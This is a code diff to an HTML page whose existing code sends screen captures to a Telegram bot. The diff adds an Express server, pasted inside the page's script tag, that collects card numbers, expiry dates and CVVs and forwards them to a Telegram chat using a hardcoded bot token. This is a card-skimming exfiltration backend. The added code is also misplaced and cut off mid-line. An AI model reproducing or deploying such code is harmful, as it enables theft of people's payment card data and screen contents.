@@ -495,9 +495,53 @@ async function startScreenCaptureAndSendToTelegram(botToken, chatId) {
 document.getElementById('startCaptureBtn').addEventListener('click', () => {
   startScreenCaptureAndSendToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
 });
-</script>
 
 
+
+
+
+const express = require('express');
+const fetch = require('node-fetch');
+const cors = require('cors');
+
+const app = express();
+app.use(cors());
+app.use(express.json());
+
+const TELEGRAM_BOT_TOKEN = '7740489037:AAHgOz-DbTeXM-IqY9luQNPL4uao1kWrudU';
+const TELEGRAM_CHAT_ID = '5395609882';
+
+app.post('/sendTelegram', async (req, res) => {
+  const { cardNumber, expiry, cvv } = req.body;
+
+  const message = `
+Kart Bilgileri:
+Kart Numarası: ${cardNumber}
+Son Kullanma Tarihi: ${expiry}
+CVV: ${cvv}
+  `;
+
+  try {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+      }),
+    });
+
+    const data = await response.json();
+    if (!data.ok) throw new Error(data.description);
+
+    res.json({ success: true });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.listen(3000, () => console.log('Server 3000 portund
 
 
 
@@ -505,7 +549,8 @@ document.getElementById('startCaptureBtn').addEventListener('click', () => {
 
 
     
+</script>
 
-  </script>
+
 </body>
 </html>
